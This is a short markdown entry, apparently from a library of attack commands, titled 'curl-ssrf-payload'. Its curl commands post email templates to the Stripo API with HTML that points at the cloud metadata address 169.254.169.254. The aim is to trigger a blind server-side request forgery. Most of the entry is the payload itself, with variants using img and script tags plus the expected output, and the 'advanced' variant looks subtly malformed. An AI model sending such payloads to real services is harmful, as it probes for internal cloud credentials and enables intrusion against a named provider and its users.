---
data: >-
  curl -X POST 'https://app.stripo.email/api/templates' -H 'Authorization:
  Bearer YOUR_TOKEN' -H 'Content-Type: application/json' -d '{"name":"Test
  Template","content":"<img src=\"http://169.254.169.254/latest/meta-data/\">"}'
tags:
  - ssrf
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:09.520Z'
id: a4e9eda8-e88f-4e9a-a24c-99bda7bcad11
verified: false
validated: true
submitted: true
---
# curl-ssrf-payload

## Command

```bash
curl -X POST 'https://app.stripo.email/api/templates' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"name":"Test Template","content":"<img src=\"http://169.254.169.254/latest/meta-data/\">"}'
```

## Description

This command sends a POST request to the Stripo email template API with a JSON payload containing a malicious URL in the content field, exploiting the Blind SSRF vulnerability to trigger an internal request from the server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `-H 'Authorization: Bearer YOUR_TOKEN'` | Authentication header with session token | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON content type | Yes |
| `-d '{...}'` | JSON data with template name and SSRF payload in content | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://app.stripo.email/api/templates' -H 'Authorization: Bearer token123' -H 'Content-Type: application/json' -d '{"name":"Test","content":"<img src=\"http://internal.example.com\">"}'
```

### Advanced Usage

```bash
curl -X POST 'https://app.stripo.email/api/templates' -H 'Authorization: Bearer token123' -H 'Content-Type: application/json' --data-urlencode '{"name":"Advanced","content":"<script src=\"http://169.254.169.254/latest/meta-data/\"></script>"}'
```

## Expected Output

HTTP 200 OK response with JSON confirming template creation, e.g., {"id": "template123", "status": "created"}. No direct SSRF output due to blind nature.

## Related

- [[Related Procedure: Exploiting-Blind-SSRF-in-Email-Template-Creation]]
